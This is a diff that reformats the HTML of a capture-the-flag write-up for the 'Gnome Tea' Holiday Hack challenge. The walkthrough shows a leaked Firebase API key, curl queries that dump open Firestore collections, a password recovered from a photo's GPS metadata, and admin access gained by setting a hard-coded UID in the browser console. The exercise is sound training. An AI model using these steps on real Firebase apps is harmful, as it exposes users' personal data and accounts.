@@ -28,11 +28,14 @@ nav: |
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Solution Overview</h2>
-
+<br>
+</p>
+<p>
 Starting with only public access to the web application, reconnaisance was conducted to identify weaknesses. A comment was found in the page code that indicated some collections may allow insecure access. Probing those collections identified a clue to a user's password that would lead to the password. The username was identified in a collection. The password was decoded from  the latitude and longitude data contained in the image metadata. Once logged into the application as the user, code that determined if a user should have admin access was identified and abused, resulting in identifing the secret passphrase.
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -69,79 +72,143 @@ Starting with only public access to the web application, reconnaisance was condu
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Detailed Solution</h2>
+<br>
+</p>
 <details>
+<p>
 <summary>Click to expand</summary>
-
+<br>
+</p>
+<p>
 Using Edge's developer tools, the application code is reviewed. An interesting comment is found on the page:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/gnometea_interestingcomment.jpg" alt="Interesting Comment">
-
+<br>
+</p>
+<p>
 The API key is part of the URL:
-
+<br>
+</p>
+<p>
 https://holidayhack2025.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&appName=%5BDEFAULT%5D&v=11.10.0&eid=p&usegapi=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.W5qDlPExdtA.O%2Fd%3D1%2Frs%3DAHpOoo8JInlRP_yLzwScb00AozrrUS6gJg%2Fm%3D__features__
-
+<br>
+</p>
+<p>
 apiKey=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
-
+<br>
+</p>
+<p>
 Using Burp, the configuration is retreived:
-
+<br>
+</p>
+<p>
 const OP={apiKey:"AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",authDomain:"holidayhack2025.firebaseapp.com",projectId:"holidayhack2025",storageBucket:"holidayhack2025.firebasestorage.app",messagingSenderId:"341227752777",appId:"1:341227752777:web:7b9017d3d2d83ccf481e98"},
-
+<br>
+</p>
+<p>
 Following the comment in the page code, let's see what collections are accessible:
-
+<br>
+</p>
+<p>
 curl -X GET \
 <br>
   https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
-
+<br>
+</p>
+<p>
 Collection contains messages, gnome names, and sender UIDS
-
+<br>
+</p>
+<p>
 curl -X GET \
 <br>
   https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
-
+<br>
+</p>
+<p>
 Collection contains avatars, authids,
-
+<br>
+</p>
+<p>
 curl -X GET \
 <br>
 https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk
-
+<br>
+</p>
+<p>
 Collection contains email addresses, notes and jpeg pictures
-
+<br>
+</p>
+<p>
 Looking in the dms collection contains a lot of messages. Searching for the string "password" reveals that Barnaby's image file contains location data that will identify his password.
-
+<br>
+</p>
+<p>
 curl -X GET \
 <br>
   https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk | grep "password"
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/gnometea_passwordhint.jpg" alt="Password Hint">
-
+<br>
+</p>
+<p>
 Searching the gnomes collection reveals Barnabies email address. This is needed for login.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/gnometea_username.jpg" alt="Barnaby's Username">
-
+<br>
+</p>
+<p>
 <strong>Username: barnabybriefcase@gnomemail.dosis</strong>
-
+<br>
+</p>
+<p>
 The correct URL to obtain Barnaby's image is: https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg
-
+<br>
+</p>
+<p>
 curl "https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media" -o drivers_license.jpeg
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/gnometea_exifdata.jpg" alt="Image Exifdata">
-
+<br>
+</p>
+<p>
 The image was taken at: 33 deg 27' 53.85" S, 115 deg 54' 37.62" E
-
+<br>
+</p>
+<p>
 Converting the Latitude and Longitude into a format for Google Maps:
-
+<br>
+</p>
+<p>
 https://www.google.com/maps?q=-33.464958,115.910450
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/gnometea_password.jpg" alt="Barnaby's Password">
-
+<br>
+</p>
+<p>
 With valid credentials, login is achieved as Barnaby.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/gnometea_login.jpg" alt="Gnome Tea Login">
-
+<br>
+</p>
+<p>
 Following the hint about client side controls, the source code now available is reviewed, and admin access is hard coded into the source.
-
+<br>
+</p>
 <pre><code class="language-javascript">
     const [r,e] = K.useState({
         totalGnomes: 0,
@@ -155,19 +222,27 @@ Following the hint about client side controls, the source code now available is 
       , {user: _} = _l()
       , T = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";
     typeof window < "u" && (window.EXPECTED_ADMIN_UID = T),
-
+<p>
 </code></pre>
-
+<br>
+</p>
+<p>
 Using the console in Edge's developer tools, admin access is achieved by setting T to 3loaihgxP0VwCTKmkHHFLe6FZ4m2
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/gnometea_solution.jpg" alt="Gnome Tea Solution">
-
+<br>
+</p>
+<p>
 <strong>Answer: GigGigglesGiggler</strong>
-
+<br>
+</p>
 </details>
-
+<p>
 <h2>Tools Reference</h2>
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -194,8 +269,10 @@ Using the console in Edge's developer tools, admin access is achieved by setting
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Hints Reference</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -226,8 +303,10 @@ Using the console in Edge's developer tools, admin access is achieved by setting
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Acknowledgements</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -242,4 +321,3 @@ Using the console in Edge's developer tools, admin access is achieved by setting
 </tr>
 </tbody>
 </table>
-
